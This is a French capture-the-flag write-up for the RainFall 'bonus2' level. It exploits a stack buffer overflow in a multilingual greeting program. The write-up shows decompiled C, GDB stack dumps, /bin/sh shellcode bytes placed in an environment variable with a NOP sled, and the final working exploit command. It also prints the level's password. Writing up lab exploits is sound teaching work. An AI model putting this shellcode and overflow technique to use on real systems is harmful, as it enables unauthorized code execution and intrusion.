# bonus2: Exploitation d'un Buffer Overflow avec des messages de salutation multilingues

## Aperçu du Challenge

Le programme `bonus2` prend deux arguments en ligne de commande et salue l'utilisateur dans une des trois langues (anglais, finnois ou néerlandais), en fonction de la variable d'environnement `LANG`. Le programme présente une vulnérabilité de type buffer overflow dans la fonction `greetuser()` qui permet d'écraser l'adresse de retour et d'exécuter du code arbitraire.

## Analyse du Code Source

Le programme se compose d'une fonction `main()` et d'une fonction `greetuser()`. Voici un résumé de son fonctionnement:

1. La fonction `main()`:

   ```c
   int main(int argc, char **argv)
   {
     char username[40];  // Buffer pour stocker le premier argument
     char message[36];   // Buffer pour stocker le second argument

     if (argc == 3) {
       // Initialisation du buffer avec des zéros

       // Copie des arguments avec risque potentiel de débordement
       strncpy(username, argv[1], 40);  // Pourrait remplir tout le buffer sans caractère nul
       strncpy(message, argv[2], 32);   // Limité à 32 octets bien que le buffer fasse 36 octets

       // Vérification de la variable d'environnement LANG
       char *lang = getenv("LANG");

       greetuser();  // Appel à la fonction vulnérable
     }
   }
   ```

2. La fonction `greetuser()`:
   ```c
   void greetuser(void)
   {
     char greeting[4];               // Petit buffer pour le début du message
     char greeting_continuation[4];  // Petit buffer pour la suite du message
     char message[64];               // Buffer pour le message spécifique à la langue

     if (language == 1) {
       // Message finnois - notez les caractères UTF-8
       greeting[0] = 'H';
       greeting[1] = 'y';
       greeting[2] = 'v';
       greeting[3] = 0xC3;  // Premier octet de 'ä' en UTF-8
       // ...existing code...

     } else if (language == 2) {
       // Message néerlandais
       // ...existing code...

     } else if (language == 0) {
       // Message anglais
       // ...existing code...
     }

     // Appel de fonction vulnérable - sans vérification des limites
     strcat(greeting, greeting_continuation);
     puts(greeting);

     return;
   }
   ```

## Vulnérabilité

La vulnérabilité principale se trouve dans la fonction `greetuser()` et comporte plusieurs problèmes:

1. **Buffers de taille fixe trop petits**:

   ```c
   char greeting[4];
   char greeting_continuation[4];
   ```

2. **Concaténation de chaînes non sécurisée**:

   ```c
   strcat(greeting, greeting_continuation);
   ```

   La fonction `strcat()` ne vérifie pas les limites des buffers, ce qui conduit à un buffer overflow.

3. **Débordement lié à la langue**:
   Lorsqu'on utilise le paramètre de langue finnoise (`LANG=fi`), le message "Hyvää päivää" contient des caractères UTF-8 qui nécessitent plusieurs octets, augmentant encore le potentiel de débordement.

## Analyse de la Disposition Mémoire avec GDB

Pour comprendre la disposition de la mémoire et concevoir notre exploit, nous avons utilisé GDB pour analyser comment le programme alloue et utilise la mémoire:

### Étape 1: Investigation Initiale

D'abord, nous avons placé des points d'arrêt dans `greetuser()` pour analyser la mémoire avant et après l'opération vulnérable:

```bash
(gdb) b greetuser
Breakpoint 1 at 0x804848a
(gdb) b *greetuser+152  # Après l'appel à strcat
Breakpoint 2 at 0x804851c
```

### Étape 2: Test avec des Motifs d'Entrée

Nous avons envoyé un motif de caractères pour voir quelle partie de notre entrée écrase quelles zones mémoire:

```bash
(gdb) set env LANG=fi
(gdb) r "$(python -c 'print "A"*40')" "$(python -c 'print "B"*18 + "CCCC" + "D"*42')"
```

### Étape 3: Examen de la Mémoire

Après avoir atteint le second point d'arrêt (après `strcat`), nous avons examiné la pile:

```bash
(gdb) x/80wx $esp
0xbffff4c0:     0xbffff4d0      0xbffff520      0x00000001      0x00000000
0xbffff4d0:     0xc3767948      0x20a4c3a4      0x69a4c370      0xc3a4c376
0xbffff4e0:     0x414120a4      0x41414141      0x41414141      0x41414141
0xbffff4f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff500:     0x41414141      0x41414141      0x42424141      0x42424242
0xbffff510:     0x42424242      0x42424242      0x42424242      0x43434343
0xbffff520:     0x44444444      0x44444444      0x00004444      0x00000000
```

### Étape 4: Localisation de l'Adresse de Retour Sauvegardée

Nous avons examiné les informations de frame pour localiser l'adresse de retour sauvegardée:

```bash
(gdb) info frame
Stack level 0, frame at 0xbffff520:
 eip = 0x804851c in greetuser; saved eip 0x43434343
 called by frame at 0xbffff524
 Arglist at 0xbffff518, args:
 Locals at 0xbffff518, Previous frame's sp is 0xbffff520
 Saved registers:
  ebp at 0xbffff518, eip at 0xbffff51c
```

Ceci a montré que notre motif "CCCC" (0x43434343) a écrasé l'adresse de retour sauvegardée à la position 0xbffff51c.

### Étape 5: Analyse du Chemin de Débordement

En analysant la disposition de la mémoire, nous avons déterminé que:

1. Le message finnois commence à 0xbffff4d0
2. Notre entrée username commence à apparaître à 0xbffff4e0
3. Le débordement de la concaténation du message atteint finalement l'adresse de retour sauvegardée à 0xbffff51c

### Étape 6: Test de l'Exploit

Nous avons testé notre compréhension en créant un exploit qui redirige l'exécution vers notre shellcode:

```bash
(gdb) b *greetuser+152
Breakpoint 1 at 0x804851c
(gdb) r "$(python -c 'print "\x90"*(40-21) + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')" "$(python -c 'print "B"*18 + "\x80\xf5\xff\xbf" + "D"*12')"
```

Lors de l'exécution, nous avons rencontré un segmentation fault dû à des problèmes de corruption de la pile. La frame de pile avait été corrompue avec nos caractères 'B':

```bash
(gdb) info frame
Stack level 0, frame at 0x4242424a:
 eip = 0xbffff588; saved eip Cannot access memory at address 0x42424246
```

## Exploitation

Après avoir bien compris la disposition de la mémoire, nous avons développé une stratégie d'exploitation fiable en utilisant des variables d'environnement:

### Étape 1: Création d'un Programme Auxiliaire

Nous avons créé un programme C pour trouver l'adresse de notre shellcode dans l'environnement:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *addr = getenv("SHELLCODE");
    if (addr) {
        printf("SHELLCODE address: %p\n", addr);
    } else {
        printf("SHELLCODE not found\n");
    }
    return 0;
}
```

### Étape 2: Configuration du Shellcode dans l'Environnement

Nous avons placé notre shellcode dans une variable d'environnement avec un NOP sled:

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

### Étape 3: Recherche de l'Adresse du Shellcode

Nous avons trouvé l'adresse de notre shellcode dans un environnement propre:

```bash
bonus2@RainFall:~$ env -i SHELLCODE=$SHELLCODE /tmp/get_shellcode_addr
SHELLCODE address: 0xbfffff06
```

### Étape 4: Construction de l'Exploit Final

En utilisant notre compréhension de la disposition de la mémoire, nous avons construit notre exploit final avec:

- Premier argument: 40 'A' pour remplir le buffer username
- Second argument: 18 'B' pour le padding + l'adresse du shellcode + 7 'C' de padding

```bash
env -i SHELLCODE=$SHELLCODE LANG=fi ./bonus2 "$(python -c 'print "A"*40')" "$(python -c 'print "B"*18 + "\x06\xff\xff\xbf" + "C"*7')"
```

## Obtention du Mot de Passe

Après exécution de notre exploit, nous avons obtenu avec succès un shell en tant que `bonus3`:

```bash
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���CCCCCCC
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Passage au Niveau Suivant

Utilisez le mot de passe pour vous connecter en tant que `bonus3`:

```bash
su bonus3
# Entrez le mot de passe: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
